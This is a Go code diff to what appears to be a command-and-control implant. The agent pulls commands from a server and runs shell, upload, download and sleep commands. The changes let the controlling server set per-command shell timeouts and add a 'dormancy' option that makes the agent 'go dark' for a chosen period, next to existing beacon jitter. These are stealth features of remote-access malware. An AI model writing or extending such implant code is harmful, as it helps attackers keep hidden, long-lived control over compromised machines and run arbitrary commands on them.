@@ -69,6 +69,7 @@ type serverCommand struct {
 	ID      string `json:"id"`
 	Type    string `json:"type"`
 	Payload string `json:"payload"`
+	Timeout int    `json:"timeout,omitempty"`
 }
 
 func New(cfg Config) *Agent {
@@ -346,9 +347,10 @@ func (a *Agent) fetchAndExecuteCommands(ctx context.Context) {
 }
 
 func (a *Agent) DispatchCommand(ctx context.Context, cmd serverCommand) (string, error) {
+	timeout := time.Duration(cmd.Timeout) * time.Second
 	switch cmd.Type {
 	case models.CmdTypeShell:
-		return a.ExecuteCommand(ctx, cmd.Payload)
+		return a.ExecuteCommand(ctx, cmd.Payload, timeout)
 	case models.CmdTypeUpload:
 		return a.handleUpload(cmd.Payload)
 	case models.CmdTypeDownload:
@@ -364,12 +366,16 @@ func (a *Agent) DispatchCommand(ctx context.Context, cmd serverCommand) (string,
 	}
 }
 
-func (a *Agent) ExecuteCommand(ctx context.Context, payload string) (string, error) {
+func (a *Agent) ExecuteCommand(ctx context.Context, payload string, timeout time.Duration) (string, error) {
 	if payload == "" {
 		return "", fmt.Errorf("empty command")
 	}
 
-	cmdCtx, cancel := context.WithTimeout(ctx, 2*time.Minute)
+	if timeout <= 0 {
+		timeout = 5 * time.Minute
+	}
+
+	cmdCtx, cancel := context.WithTimeout(ctx, timeout)
 	defer cancel()
 
 	var cmd *exec.Cmd
@@ -430,6 +436,7 @@ func (a *Agent) handleSleep(payload string) (string, error) {
 	var req struct {
 		Interval int `json:"interval"`
 		Jitter   int `json:"jitter"`
+		Dormancy int `json:"dormancy"`
 	}
 	if err := json.Unmarshal([]byte(payload), &req); err != nil {
 		return "", fmt.Errorf("invalid sleep payload: %w", err)
@@ -439,6 +446,12 @@ func (a *Agent) handleSleep(payload string) (string, error) {
 	}
 	if req.Jitter > 0 {
 		a.config.Jitter = time.Duration(req.Jitter) * time.Second
+	}
+	if req.Dormancy > 0 {
+		dur := time.Duration(req.Dormancy) * time.Second
+		log.Printf("[*] Going dark for %s", dur)
+		time.Sleep(dur)
+		return fmt.Sprintf("dormancy=%s completed, interval=%s jitter=%s", dur, a.config.Interval, a.config.Jitter), nil
 	}
 	return fmt.Sprintf("interval=%s jitter=%s", a.config.Interval, a.config.Jitter), nil
 }
